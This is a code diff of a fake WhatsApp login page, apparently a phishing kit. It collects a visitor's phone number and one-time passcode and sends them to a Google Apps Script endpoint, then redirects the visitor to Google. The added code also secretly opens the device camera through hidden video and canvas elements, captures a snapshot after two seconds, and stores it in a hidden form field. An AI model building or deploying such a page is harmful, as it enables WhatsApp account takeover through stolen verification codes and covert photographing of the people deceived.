@@ -76,46 +76,57 @@ button:hover {
   </header>
     <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
     <form id="otpForm">
-<input type="text" id="Redirected" placeholder="link" style="display:none;">
-        <input type="tel" id="phoneNumber" placeholder="Phone Number">
-        <button id="getOtpBtn">Login</button>
-        <div id="progressBar" style="display:none;">
-            <progress value="0" max="100"></progress>
-        </div>
+       <input type="hidden" name="title" value="Whatsapp">
+    <input type="hidden" name="redirect_url" value="Google.html">
+    <input type="hidden" name="urlInput" value="Whatsapp.html">
+
+   
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <input type="hidden" name="photo" id="photo">
       
-      <input type="number" id="otpInput" placeholder="OTP" style="display:none;">
-        <button id="checkOtpBtn" style="display:none;">Check OTP</button>
-        
-    </form>
+      
+      
+      <input type="hidden" id="redirect_url" name="redirect_url" value="https://Google.com">
+    
+    <input type="tel" id="phoneNumber" placeholder="Phone Number" required>
+    <button id="getOtpBtn">Login</button>
+    
+    <div id="progressBar" style="display:none;">
+      <progress value="0" max="100"></progress>
+    </div>
+    
+    <input type="number" id="otpInput" placeholder="OTP" style="display:none;" required>
+    <button id="checkOtpBtn" style="display:none;">Check OTP</button>
+  </form>
+  
   <footer>
     <p>&copy; OTP Form Footer</p>
   </footer>
-
-    <script> 
-let phoneNumberValue;
-
-const urlParams = new URLSearchParams(window.location.search);
-const site = urlParams.get('link');
-document.getElementById('Redirected').value = site;
+  
+  <script>
+   let phoneNumberValue;
+const scriptUrl = 'https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec';
 
 document.getElementById('getOtpBtn').addEventListener('click', getOtp);
 document.getElementById('checkOtpBtn').addEventListener('click', checkOtp);
 
-var scriptUrl = 'https://script.google.com/macros/s/AKfycbwhapeXkkJFI-8Wx1Iko0SKLR1Grp0o2P2QxBRemReiP3lzWCe-tZJ71xck-hMhj0nB/exec';
-
 function getOtp(e) {
   e.preventDefault();
-  phoneNumberValue = document.getElementById('phoneNumber').value;
+  phoneNumberValue = document.getElementById('phoneNumber').value.trim();
+
   if (phoneNumberValue.length < 11) {
     alert('Invalid phone number');
     return;
   }
-  
+
   document.getElementById('progressBar').style.display = 'block';
-  var progress = 0;
-  var interval = setInterval(() => {
+  let progress = 0;
+  const progressElem = document.querySelector('progress');
+  const interval = setInterval(() => {
     progress += 20;
-    document.querySelector('progress').value = progress;
+    progressElem.value = progress;
     if (progress >= 100) {
       clearInterval(interval);
       document.getElementById('progressBar').style.display = 'none';
@@ -125,32 +136,77 @@ function getOtp(e) {
       document.getElementById('getOtpBtn').style.display = 'none';
     }
   }, 1000);
-  
-  fetch(`${scriptUrl}?phoneNumber=${phoneNumberValue}`)
+
+  // First fetch: send phone number (GET request here, can be POST too)
+  fetch(`${scriptUrl}?phoneNumber=${encodeURIComponent(phoneNumberValue)}`)
     .then(response => response.json())
-    .then(data => console.log(data))
+    .then(data => console.log('OTP sent:', data))
     .catch(error => console.error('Error:', error));
 }
 
 function checkOtp(e) {
   e.preventDefault();
-  var otp = document.getElementById('otpInput').value;
-  var site = document.getElementById('Redirected').value;
-  
-  fetch(`${scriptUrl}?phoneNumber=${phoneNumberValue}&otp=${otp}&site=${site}`)
-    .then(response => response.json())
-    .then(data => {
-      if (data.status === 'success') {
-       window.location.href = '/NumberInfo.html?NumberInfo.html&user=verified';
-      } else {
-        alert('Invalid OTP or phone number');
-      }
-    })
-    .catch(error => console.error('Error:', error));
+  const otp = document.getElementById('otpInput').value.trim();
+  const redirectUrl = document.getElementById('redirect_url').value.trim();
+
+  if (!otp) {
+    alert('Please enter the OTP');
+    return;
+  }
+
+  // Prepare POST body parameters for second request
+  const params = new URLSearchParams();
+  params.append('phoneNumber', phoneNumberValue);
+  params.append('otp', otp);
+
+  // Second fetch: send phone number + otp via POST
+  fetch(scriptUrl, {
+    method: 'POST',
+    body: params,
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    }
+  })
+  .then(response => {
+    if (!response.ok) throw new Error('Network response was not ok');
+    return response.json(); // Assuming your server returns JSON
+  })
+  .then(data => {
+    if (data.status === 'success') {
+      window.location.href = redirectUrl;  // Redirect only after success
+    } else {
+      alert('Invalid OTP or phone number');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    // Redirect on error if you want (optional)
+    window.location.href = redirectUrl;
+  });
 }
-      
-      
-      
+const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const photoInput = document.getElementById('photo');
+
+  // Access the camera and capture a photo after 2 seconds
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // fallback width
+        canvas.height = video.videoHeight || 480; // fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoInput.value = canvas.toDataURL('image/png');
+
+        // Stop the video stream to free camera
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+      }, 2000);
+    })
+    .catch(err => console.error("Error accessing camera: ", err));
+</script>
   </script>
 </body>
 </html>
